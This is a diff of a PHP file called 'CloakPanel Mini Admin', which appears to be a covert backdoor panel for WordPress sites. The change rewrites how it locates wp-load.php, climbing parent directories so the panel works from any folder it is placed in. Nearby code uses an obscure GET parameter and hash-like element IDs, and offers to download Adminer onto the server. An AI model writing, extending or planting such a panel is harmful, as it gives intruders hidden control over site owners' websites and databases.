@@ -1,6 +1,6 @@
 <?php
 /*
- * CloakPanel Mini Admin v1.0
+ * CloakPanel Mini Admin v1.1
  * PHP & JavaScript based lightweight admin interface
  * Authored    : privdayz.com
  *
@@ -25,9 +25,13 @@
  *  - Always audit & harden before deploying on production.
  */
 session_start();
-$wp_root = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
-if (! file_exists("{$wp_root}/wp-load.php")) {
-    die('wp-load.php not found.');
+$wp_root = __DIR__;
+while ( ! file_exists("{$wp_root}/wp-load.php") ) {
+    $parent = dirname($wp_root);
+    if ( $parent === $wp_root ) {
+        die('wp-load.php not found.');
+    }
+    $wp_root = $parent;
 }
 require_once "{$wp_root}/wp-load.php";
 if ( isset($_GET['6fb46751012']) ) {
@@ -276,8 +280,7 @@ if ( ! empty($_REQUEST['ajax']) ) {
           <button id="a8e7a46f55fe7b75c32443e3af8cf9a7" class="btn btn-sm btn-outline-secondary">Show</button>
         </p>
         <div class="mt-3">
-          <?php if (file_exists(__DIR__.'/adminer.php')): ?>
-            <a href="adminer.php" class="btn btn-primary btn-sm">Open Adminer</a>
+          <?php if (file_exists(__DIR__.'/adminer.php')): ?><a href="adminer.php" class="btn btn-primary btn-sm">Open Adminer</a>
           <?php else: ?>
             <a href="?6fb46751012=1" class="btn btn-primary btn-sm">Download Adminer</a>
           <?php endif; ?>
